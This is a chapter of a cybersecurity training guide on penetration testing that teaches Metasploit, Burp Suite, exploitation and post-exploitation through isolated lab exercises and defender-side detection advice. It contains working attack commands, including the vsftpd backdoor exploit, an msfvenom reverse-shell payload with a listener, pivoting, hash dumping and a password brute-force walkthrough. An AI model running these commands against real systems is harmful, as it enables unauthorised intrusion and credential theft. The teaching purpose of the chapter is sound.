
# Chapter 8: Penetration Testing

**Cybersecurity Guide Book | Roadmap step 8 of 12** | Author: [ashihh07](https://github.com/ashihh07)

[Back to roadmap](../README.md) | [Previous: Chapter 7 Vulnerability Assessment](../07-vulnerability-assessment/README.md) | [Download the PDF version](Chapter-08-Penetration-Testing.pdf)

> A vulnerability assessment says a door might be unlocked. Penetration testing walks up and tries the handle, with permission, and writes down exactly what was behind it.

---

## About this chapter

Chapter 7 produced a prioritised list of weaknesses. **Penetration testing** proves which of them actually let an attacker in, how far they could go once inside, and what that would cost the business. It is manual, creative work that automated scanners cannot do, built on everything so far: networking, Linux, code, the web, and the method from Chapter 6.

The roadmap lists four items:

- **Metasploit:** a framework for finding, configuring and launching exploits.
- **Burp Suite:** the standard tool for testing web applications by hand.
- **Exploitation:** turning a vulnerability into actual access.
- **Post-exploitation:** what to do once you have a foothold.

### How each topic is built

- **Concept**: what it is and why it exists.
- **Attacker view**: the authorised tester's actions, which are the same actions a real attacker takes.
- **Defender view**: what each step looks like from the blue team's side, and how to stop or slow it.
- **Labs**: run only against deliberately vulnerable machines in your own isolated lab.

### Contents

| # | Section | Roadmap item covered |
|---|---------|----------------------|
| 1 | [Penetration testing as a discipline](#1-penetration-testing-as-a-discipline) | Orientation |
| 2 | [Metasploit](#2-metasploit) | Metasploit |
| 3 | [Burp Suite](#3-burp-suite) | Burp Suite |
| 4 | [Exploitation](#4-exploitation) | Exploitation |
| 5 | [Post-exploitation](#5-post-exploitation) | Post Exploitation |
| 6 | [The defender's view of an intrusion](#6-the-defenders-view-of-an-intrusion) | SOC view of all of the above |
| 7 | [Hands-on labs](#7-hands-on-labs) | Practice for all of the above |
| 8 | [Quick revision sheet](#8-quick-revision-sheet) | Tables and commands |
| 9 | [Self-check quiz and answers](#9-self-check-quiz) | Test yourself |

> [!WARNING]
> **Ground rule. This is the most powerful, and most legally sensitive, chapter in this book.**
> - Everything here works against real systems. Running it against anything you do not own or do not have **written** permission to test is a criminal offence in most countries, full stop. Curiosity is not a defence.
> - Practise only on: your own host-only lab (Metasploitable, DVWA, VulnHub images), training platforms (TryHackMe, Hack The Box, PortSwigger Web Security Academy), and, for public bug bounty programmes, exactly within their published scope and rules.
> - Keep vulnerable VMs on a **host-only** network. Never expose Metasploitable or similar images to the internet; they are intentionally broken.
> - A real engagement always starts with signed authorisation and a rules of engagement document (Chapter 6, section 1). In your lab, write a one-page version anyway.

---

## 1. Penetration testing as a discipline

### Concept

A **penetration test** simulates a real attack, with permission, to answer a business question: "if someone tried to break in, what could they actually do?" It goes beyond Chapter 7 by **exploiting** findings, **chaining** small weaknesses into serious ones, and showing **impact** instead of a severity score.

### Types of engagement

| Type | Tester knows | Defenders know it is happening? | Use case |
|------|--------------|----------------------------------|----------|
| **Black box** | Nothing but the target's name | Usually not | Simulates an outside attacker |
| **Grey box** | Some internal information (an account, a network diagram) | Usually not | Most common; realistic and time-efficient |
| **White box** | Full access: source code, architecture, credentials | Yes | Deepest review, used for critical systems |
| **Red team** | Varies | **No** (tests detection and response too) | Tests people and process, not just systems |
| **Purple team** | Full cooperation with defenders | **Yes** | Attacker and defender work together to improve detection |

### Where this sits in the method

```text
Recon & footprinting -> Scanning & enumeration -> Vulnerability assessment -> EXPLOITATION -> POST-EXPLOITATION -> Reporting
      (Chapter 6)              (Chapter 6)                (Chapter 7)           (this chapter)    (this chapter)
```

### MITRE ATT&CK, again

Chapter 6 introduced ATT&CK's Reconnaissance tactic. This chapter lives mostly in these tactics: **Initial Access** (TA0001), **Execution** (TA0002), **Persistence** (TA0003), **Privilege Escalation** (TA0004), **Defense Evasion** (TA0005), **Credential Access** (TA0006), **Discovery** (TA0007), **Lateral Movement** (TA0008), and **Exfiltration** (TA0010). Professional reports map findings to these IDs so defenders can search their own logs for the exact technique used.

> [!TIP]
> **Defender view**
> - A penetration test is one of the few times your detections get tested against a real, adaptive opponent instead of a scanner signature. Treat every test as a free detection audit, whether or not a single alert fired.

---

## 2. Metasploit

### Concept

**Metasploit Framework** (Rapid7, open source, current major version 6.x) is a library of exploits, payloads and auxiliary modules, with a console that ties them together. It turns "I know this version has CVE-2021-XXXX" into a repeatable, configurable attack.

```bash
sudo apt install metasploit-framework     # preinstalled on Kali
msfconsole                                # launch the interactive console
```

### Core concepts

| Term | Meaning |
|------|---------|
| **Module** | A piece of functionality: `exploit`, `auxiliary`, `payload`, `post`, `encoder`, `nop` |
| **Exploit** | Code that uses a specific vulnerability to run attacker code |
| **Payload** | What runs once the exploit succeeds, for example a shell |
| **Meterpreter** | Metasploit's advanced payload: runs in memory, has many built-in post-exploitation commands |
| **Session** | An active connection to a compromised target |
| **RHOSTS / RPORT** | The target address(es) and port |
| **LHOST / LPORT** | Your listener address and port, for payloads that call back to you |

### A session in msfconsole

```text
msf6 > search type:exploit vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
msf6 exploit(...) > set RHOSTS 192.168.56.101
msf6 exploit(...) > show payloads
msf6 exploit(...) > set PAYLOAD cmd/unix/interact
msf6 exploit(...) > check                 # some modules can test without exploiting
msf6 exploit(...) > run
```

### Core commands

| Command | Does |
|---------|------|
| `search <term>` | Find modules by name, CVE, or platform |
| `use <module>` | Select a module to configure |
| `show options` / `show payloads` | What this module needs, and what it can run |
| `set <OPTION> <value>` / `setg` | Configure a value for this module, or globally for the session |
| `info` | Full detail on the selected module |
| `check` | Test whether the target looks vulnerable, without exploiting (not every module supports this) |
| `run` / `exploit` | Launch it |
| `sessions -l` / `sessions -i N` | List active sessions, interact with one |
| `back` | Leave the current module |

### Payload types

| Type | Behaviour |
|------|-----------|
| **Bind shell** | Target opens a port and waits for you to connect. Fails if the target is behind a firewall or NAT that blocks inbound |
| **Reverse shell** | Target connects **back** to you. Far more reliable, because outbound traffic is usually less restricted |
| **Staged** (`.../meterpreter/reverse_tcp`) | Sends a small stager first, which pulls the rest of the payload. Smaller initial payload |
| **Stageless** (`.../meterpreter_reverse_tcp`) | Everything in one payload. Larger, but one fewer network step for a defender to catch |

```bash
# Generate a standalone payload file with msfvenom
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o shell.elf

# A listener to catch the callback, without the rest of msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.56.1
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

### Auxiliary modules

Not every module exploits something. **Auxiliary** modules scan, brute-force or gather information:

```text
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > use auxiliary/scanner/ssh/ssh_login          # credential testing
msf6 > use auxiliary/scanner/smb/smb_version
```

> [!CAUTION]
> **Attacker view**
> - Metasploit turns "this CVE exists" into working access in minutes, which is exactly why patching known, exploitable vulnerabilities fast matters so much.
> - `search cve:2021-XXXXX` is often the first thing tried once a new critical vulnerability is public.
> - Reverse shells are preferred because outbound connections usually get less scrutiny than inbound ones.

> [!TIP]
> **Defender view**
> - Metasploit's default Meterpreter traffic and many stock payloads have **known signatures**. Up-to-date EDR and IDS/IPS (such as Suricata) catch unmodified Metasploit traffic far more often than custom tooling.
> - Outbound filtering matters. If a workstation can open a connection to any address on any port, a reverse shell sails straight through.
> - Watch for a process you do not recognise holding a long-lived outbound connection (Chapter 2's process and `ss` commands), and for new, unexpected local listeners.

---

## 3. Burp Suite

### Concept

**Burp Suite** (PortSwigger) is the standard tool for manually testing web applications. It sits as a **proxy** between your browser and the target, so you see and can change every request and response, which is how Chapter 5's attacks (SQLi, XSS, CSRF, access control) are actually carried out against a real application rather than hand-typed with `curl`.

### Editions

| Edition | Cost | What you get |
|---------|------|---------------|
| **Community** | Free | Proxy, Repeater, Decoder, Sequencer, Comparer, and a speed-limited, demo version of Intruder. No automated scanner, no saved project files |
| **Professional** | Paid | Everything in Community, plus the full Scanner, unthrottled Intruder, saved projects, Collaborator (out-of-band testing), and more extensions |

This book uses **Community**, which is enough to learn every technique in Chapter 5 by hand. Community's lack of a scanner is a feature for learning: it forces you to understand *why* a request is interesting, not just click "scan".

### Setting it up

```text
1. Open Burp Suite -> start a Temporary Project (Community has no saved projects)
2. Proxy tab -> confirm the proxy listens on 127.0.0.1:8080
3. In your browser, set the HTTP/HTTPS proxy to 127.0.0.1:8080
   (or use Burp's bundled Chromium browser, which is preconfigured)
4. Visit http://burpsuite, download and install the CA certificate,
   so Burp can also show you HTTPS traffic without browser warnings
5. Browse your target (Juice Shop, DVWA) normally -> Burp records every request in "HTTP history"
```

### The tools you will use constantly

| Tool | What it does | Chapter 5 connection |
|------|---------------|----------------------|
| **Proxy** | Intercepts and can hold or edit a request before it is sent | See the raw request before any JavaScript or browser rule touches it |
| **Repeater** | Resend one captured request, edit it, resend again | The main tool for manually testing SQLi, XSS payloads, IDOR by changing an ID |
| **Intruder** | Automates sending many versions of a request, swapping a chosen position for values from a list | Brute-forcing a login, fuzzing a parameter (throttled in Community) |
| **Decoder** | Encode and decode URL, Base64, HTML entities, hashes | Reading an encoded XSS payload, decoding a JWT (Chapter 4) |
| **Comparer** | Diff two requests or responses | Spotting what changed between a working and a failing request |
| **Sequencer** | Analyses randomness in tokens | Checking whether a session ID or CSRF token is predictable |

### A Repeater walkthrough

```text
1. In HTTP history, find a request with a parameter, e.g. GET /product?id=7
2. Right-click -> "Send to Repeater"
3. In Repeater, change id=7 to id=8 and click Send
4. Compare the response: do you see another user's or product's data? (IDOR, Chapter 5)
5. Change id=7 to id=7' and click Send
6. A SQL error or a different response length/time suggests SQL injection (Chapter 5)
```

### Intruder in one example

```text
1. Send a login request to Intruder (Send to Intruder)
2. Positions tab: mark the password field as a payload position, e.g. password=§guess§
3. Payloads tab: load a small wordlist (Community throttles speed, so keep the list short)
4. Start attack, then sort results by response length or status code
   -> a different length or a 200 instead of 401/302 often marks the correct password
```

> [!CAUTION]
> **Attacker view**
> - Manual testing with Repeater finds logic flaws that automated scanners miss entirely, because it requires understanding *what the application is trying to do*, not just pattern-matching payloads.
> - Burp's bundled CA certificate lets a tester see inside HTTPS traffic they control. The same trick, done without consent by installing a rogue certificate on a victim's device, is a real and serious attack.

> [!TIP]
> **Defender view**
> - A burst of requests with **one parameter systematically incremented or swapped** while everything else is identical is Repeater or Intruder at work. It is the same IDOR-walking pattern from Chapter 5's logs, just produced by a tool instead of `curl` in a loop.
> - Rate limiting and account lockout slow down Intruder-style brute forcing. Logging **unique parameter values tried per session** catches fuzzing that status codes alone would miss.

---

## 4. Exploitation

### Concept

**Exploitation** is the moment a vulnerability becomes access. Chapter 5 showed the web flaws; this section is about the broader categories, and the care a professional takes before pulling the trigger.

### Categories of exploit

| Category | Idea | Example |
|----------|------|---------|
| **Memory corruption** | Overwrite memory the program did not intend to let you touch | Buffer overflow, use-after-free |
| **Logic flaws** | The application does exactly what it was told, and that is the bug | Race conditions, broken workflow assumptions |
| **Injection** | Input is executed as code (Chapters 3 and 5) | SQL injection, command injection |
| **Deserialization** | Untrusted data is turned back into live objects or code | Unsafe `pickle`/`yaml.load` (Chapter 3), Java/PHP deserialization |
| **Credential-based** | No code flaw at all, just a weak, default, leaked or guessed credential | Default router password, reused leaked password (Chapter 5) |
| **Misconfiguration** | A setting, not a bug | Anonymous FTP, exposed `.git`, an open S3 bucket (Chapter 4 and 6) |

A huge share of real-world breaches use the **last two rows**: nobody needs a zero-day when a default password or an exposed backup file works.

### A simplified buffer overflow, conceptually

```text
Memory for a fixed-size buffer:   [-------- 64 bytes --------][return address]
Program copies input with no length check (e.g. old C strcpy)
Attacker sends input longer than 64 bytes
                                   [--- attacker's data ------][overwritten return address]
When the function returns, execution jumps to the ADDRESS THE ATTACKER CHOSE
```

This is why Chapter 3's rule "never trust input, always check its length and type" is not just a web rule. Modern defences (stack canaries, ASLR, non-executable memory, safer languages) make this much harder than it once was, but it remains a real exploit class, especially in older or embedded software.

### Responsible exploitation: a professional's checklist

1. **Confirm scope.** Is this exact host and port covered by the authorisation?
2. **Prefer the least destructive option.** A proof of read access beats a crash. A `check` beats a `run` when the module supports it.
3. **Expect instability.** Old, intentionally vulnerable systems (and some production ones) can crash from an exploit attempt. Warn the system owner and have a rollback plan (snapshots) before you try anything with real impact.
4. **Capture evidence as you go.** Screenshot or log each successful step immediately, because sessions and uptime are fragile.
5. **Stop at the agreed line.** The rules of engagement may say "prove access, do not read production data." Follow it exactly, even when curiosity says otherwise.

> [!CAUTION]
> **Attacker view**
> - Real attackers do not usually need novel exploits. They need one of: a default credential, an unpatched known CVE, an exposed misconfiguration, or a person who clicks a link.
> - A chain of three medium findings (an exposed admin panel, a weak password policy, no MFA) often beats one critical CVE, because it needs no custom exploit code at all.

> [!TIP]
> **Defender view**
> - This is why Chapter 7's "fix the known, exploitable, reachable things first" matters more than chasing the rarest bug.
> - Detect the **attempt**, not just success: repeated crashes or restarts of a service, unexpected child processes (Chapter 2), and new unexplained local admin accounts or credentials in use.

---

## 5. Post-exploitation

### Concept

Getting a shell is rarely the goal. **Post-exploitation** is everything done after that first foothold, to understand what it is worth and how far it reaches.

### The phases

| Phase | Question | Example actions |
|-------|----------|------------------|
| **Situational awareness** | Where am I, and who am I? | `whoami`, `id`, `hostname`, `ip addr`, `sysinfo` in Meterpreter |
| **Privilege escalation** | Can I become a more powerful user? | SUID hunting (Chapter 2), kernel exploits, misconfigured services, `sudo -l` |
| **Credential access** | What secrets are already here? | Password files, saved browser credentials, SSH keys, memory dumps |
| **Persistence** | Will I still have access after a reboot? | Cron jobs, services, SSH keys (Chapter 2 patterns) |
| **Lateral movement** | What else can I reach from here? | Pivoting into networks this host can see but you cannot |
| **Data identification** | What is actually valuable here? | Databases, documents, source code, personal data |
| **Cleanup** (authorised tests only) | Did I leave anything behind? | Remove added accounts, files and persistence, as agreed in the RoE |

### Privilege escalation, quickly revisited

Chapter 2 already gave you the core Linux checks:

```bash
sudo -l                                    # what can I run as root without a password?
find / -perm -4000 -type f 2>/dev/null     # every SUID binary
```

In Metasploit, after getting a session:

```text
meterpreter > getuid
meterpreter > sysinfo
meterpreter > run post/multi/recon/local_exploit_suggester   # suggests privesc modules for this host
```

Automated enumeration scripts (`linpeas.sh` for Linux, `winpeas.exe` for Windows) check dozens of known privilege-escalation paths at once and are standard in labs. Read what a script checks before you run it on a real engagement, since some checks are noisy or intrusive.

### Pivoting, conceptually

```text
Your machine  --->  Compromised host A  --->  Internal network B  (not directly reachable by you)
```

Metasploit's `autoroute` lets traffic from other modules travel through an existing session, so you can scan and attack network B using host A as a relay, exactly as Chapter 1's NAT concept works in reverse.

```text
meterpreter > run autoroute -s 10.10.10.0/24
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(...) > set RHOSTS 10.10.10.0/24    # now reachable through the pivot
```

### Meterpreter essentials

| Command | Does |
|---------|------|
| `sysinfo` | OS, hostname, architecture |
| `getuid` | Current user |
| `ps` | List processes on the target |
| `migrate <PID>` | Move into another process (more stable, different privileges) |
| `hashdump` | Dump password hashes (where privileges allow) |
| `download` / `upload` | Move files between you and the target |
| `shell` | Drop into a native command shell |
| `background` | Suspend the session and return to `msfconsole` |

> [!CAUTION]
> **Attacker view**
> - After the first foothold, attackers spend most of their actual time here, not in exploitation: quietly escalating, harvesting credentials, and moving sideways to the systems that actually matter.
> - Compromising one low-value machine is often just the first step toward a domain controller or a database server several hops away.

> [!TIP]
> **Defender view**
> - This is where **detection matters most**, because post-exploitation activity happens on hosts you already have full visibility into, unlike the initial exploit which may arrive from outside.
> - Watch for: a process spawning an unusual child (`nginx` spawning `bash`, Chapter 2 and 4), unexpected use of `sudo`, new SUID files, new cron entries or services (Chapter 2's persistence spots), unusual internal connections from a host that normally only talks to two servers, and credential use from a host or at a time that does not fit the user's pattern.
> - **Network segmentation limits pivoting.** If host A cannot reach network B at all, `autoroute` has nothing to route through.

---

## 6. The defender's view of an intrusion

Put the chapter together as a timeline, and you have the shape of most real attacks, and most SOC investigations:

| Stage | Attacker tool here | What the defender should see |
|-------|---------------------|-------------------------------|
| Recon and scanning | Nmap, OSINT (Chapter 6) | Probe traffic, scan patterns |
| Exploitation | Metasploit, Burp, a web flaw (Chapter 5) | A crash or restart, an odd request, a new process |
| Foothold | Reverse shell, Meterpreter | New outbound connection, unrecognised process |
| Privilege escalation | SUID abuse, `local_exploit_suggester` | New SUID file, unusual `sudo` use |
| Persistence | Cron, services, SSH keys (Chapter 2) | New scheduled job, new service, new key in `authorized_keys` |
| Lateral movement | `autoroute`, stolen credentials | Internal connections that break the host's normal pattern |
| Reporting (attacker) | Evidence, a written report | This becomes the **defender's fix list** |

A single well-run test gives a SOC team a concrete, end-to-end story to hunt for in their own logs, which is worth more than almost any amount of scanner output alone.

---

## 7. Hands-on labs

Every lab runs against your own isolated, host-only lab. Write each one up: goal, exact commands, evidence, and, as importantly, **what a defender would have seen**.

### Lab 1: Build (or confirm) the lab

Reuse the Chapter 6 and 7 host-only network. Attacker VM (Kali) and a deliberately vulnerable target (Metasploitable 2 is used throughout this chapter's examples). Snapshot both before you start.

**Goal:** `ping` works between the VMs, and the target cannot reach the internet.

### Lab 2: First Metasploit exploit

```text
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target-ip>
run
```

**Goal:** a working shell on the target. Run `id` and `uname -a` from inside it, and explain in one sentence why this particular backdoor exists (hint: it is a known, intentionally planted backdoor in an old version, not a subtle bug).

### Lab 3: Reverse shell with msfvenom and a handler

Generate a payload with `msfvenom`, transfer it to the target some way you can justify in a lab (for example a simple HTTP server, Chapter 4), run it there, and catch it with `exploit/multi/handler` as shown in [section 2](#2-metasploit).

**Goal:** explain, from what you observed, why a **reverse** shell worked more reliably than a bind shell would have on a NAT'd network.

### Lab 4: Burp Suite basics

Start Juice Shop (Chapter 5) or DVWA. Proxy your browser through Burp, install its CA certificate, and browse the app. In HTTP history, find one request with a parameter, send it to Repeater, and reproduce one of Chapter 5's attacks (an IDOR by changing an ID, or a reflected XSS payload) by editing and resending it in Repeater instead of typing a URL by hand.

**Goal:** a screenshot of the edited request in Repeater and the resulting response, with one sentence on what changed and why it worked.

### Lab 5: Intruder against a login form

Using Juice Shop or DVWA's login page, send the login request to Intruder, mark the password as the payload position, and load a short list of common passwords (10 to 20 entries is plenty given Community's throttling).

**Goal:** identify the correct password by response length or status code, and explain the one setting (account lockout, or rate limiting) that would have stopped this in a real application.

### Lab 6: Privilege escalation on Metasploitable

From your Lab 2 shell, run the Chapter 2 manual checks (`sudo -l`, the SUID `find` command) and, separately, Metasploit's `local_exploit_suggester` against a Meterpreter session on the same host.

**Goal:** one working path to a higher-privileged user, and a one-paragraph comparison of what the manual checks found versus what the automated suggester found.

### Lab 7: Pivot to a second network

If your lab has a second host-only network with a machine only reachable from your compromised target, use `autoroute` to scan or reach it from `msfconsole` (see [section 5](#5-post-exploitation)).

**Goal:** a successful scan of the second network routed through your first foothold, and a diagram (even a hand-drawn one) of the path the traffic took.

### Lab 8: Be the defender

Before repeating Lab 2's exploit, start capturing on the target (`tcpdump`, or just watch `ps`/`ss` live, Chapter 2) and tail its logs. Run the exploit again. Then, separately, apply one real mitigation (patch, disable the vulnerable service, or a firewall rule), and try the exploit a third time.

**Goal:** the specific evidence that marked the compromise (a new process, a new connection, a log entry), and confirmation that your mitigation actually stopped the third attempt.

### Lab 9: Write the report

Using the Chapter 7 report format, write a one-finding report for the vsftpd backdoor you exploited in Lab 2: title, severity, evidence (the exact commands and output), business impact in plain language, and the fix.

**Goal:** a report you would be comfortable showing to a non-technical manager.

> [!NOTE]
> **Next step on TryHackMe and Hack The Box:** start with the Metasploit and the Burp Suite rooms, then easy-rated boxes. Write every one up the same way: commands, evidence, defender view, and what you learned.

---

## 8. Quick revision sheet

### Engagement types

| Type | Knowledge | Defenders told? |
|------|-----------|------------------|
| Black box | None | Usually not |
| Grey box | Partial | Usually not |
| White box | Full | Yes |
| Red team | Varies | No (tests detection) |
| Purple team | Full | Yes (works with defenders) |

### Metasploit commands

| Command | Does |
|---------|------|
| `search <term>` | Find a module |
| `use <module>` | Select it |
| `show options` | What it needs |
| `set OPTION value` | Configure it |
| `check` | Test without exploiting (where supported) |
| `run` / `exploit` | Launch |
| `sessions -l` / `-i N` | List / interact |
| `msfvenom -p ... -f ... -o file` | Generate a standalone payload |

### Burp Suite tools

| Tool | Use |
|------|-----|
| Proxy | See and edit raw requests |
| Repeater | Resend and tweak one request, by hand |
| Intruder | Automate many versions of a request |
| Decoder | Encode/decode values |
| Comparer | Diff two requests or responses |
| Sequencer | Check token randomness |

### One-line summaries

- **A pen test proves impact.** An assessment only estimates severity (Chapter 7).
- **Reverse shells beat bind shells** on most real, NAT'd or firewalled networks.
- **Most real breaches use a known CVE, a default credential, or a misconfiguration,** not a novel exploit.
- **Post-exploitation, not the initial exploit, is where most attacker time goes,** and where defenders have the best chance to catch them.
- **Pivoting needs a reachable path.** Segmentation is a real defence against it.
- **Only test what you are authorised to test, exactly as the rules of engagement say.**

---

## 9. Self-check quiz

Answer without looking back, then open the key.

1. What is the difference between a black box and a white box engagement?
2. In Metasploit, what is the difference between an exploit and a payload?
3. Why does a reverse shell usually work more reliably than a bind shell?
4. What does Burp Suite Community lack that Professional includes?
5. In Burp, which tool would you use to manually change one parameter and resend a request?
6. Name two exploit categories that involve no code flaw at all.
7. What does `local_exploit_suggester` do in Metasploit?
8. What is pivoting, and what single network control limits it?
9. Why do most real-world breaches not need a novel, "zero-day" exploit?
10. Why is post-exploitation often the stage where defenders have the best chance to detect an intrusion?

<details>
<summary>Show answer key</summary>

1. In a black box engagement the tester starts with no inside information about the target, simulating an outside attacker. In a white box engagement the tester has full access to source code, architecture and credentials, for the deepest possible review.
2. The exploit is the code that uses a specific vulnerability to gain execution. The payload is what then runs on the target, such as a shell or Meterpreter.
3. A reverse shell has the target connect outbound to the attacker, and outbound connections are usually far less restricted by firewalls and NAT than unsolicited inbound ones that a bind shell needs.
4. The automated Scanner, unthrottled Intruder, saved project files, and Collaborator (out-of-band testing), among other extensions.
5. Repeater.
6. Any two of: credential-based (default, weak or leaked passwords) and misconfiguration (such as anonymous FTP or an exposed `.git` directory).
7. It examines the compromised host and suggests Metasploit privilege-escalation modules that are likely to work against it.
8. Pivoting is routing traffic through an already-compromised host to reach a network the attacker could not otherwise reach. Network segmentation (no route from the compromised host to the target network) limits it.
9. Because a default credential, an already-known unpatched CVE, or a plain misconfiguration is usually enough, and is far cheaper to use than developing or buying a new exploit.
10. Because, unlike the initial external exploit, post-exploitation activity happens entirely on hosts the defender already has full visibility and logging on, such as new processes, new persistence mechanisms and unusual internal connections.

</details>

---

## What comes next

**Chapter 9: Network Analysis.** You have exploited a host and moved beyond it. Next you learn to read the traffic itself in detail with Wireshark, understand packet-level analysis, and use IDS/IPS concepts to catch what this chapter's techniques leave behind on the wire.

[Back to roadmap](../README.md) | [Previous: Chapter 7 Vulnerability Assessment](../07-vulnerability-assessment/README.md) | [Download the PDF version](Chapter-08-Penetration-Testing.pdf)
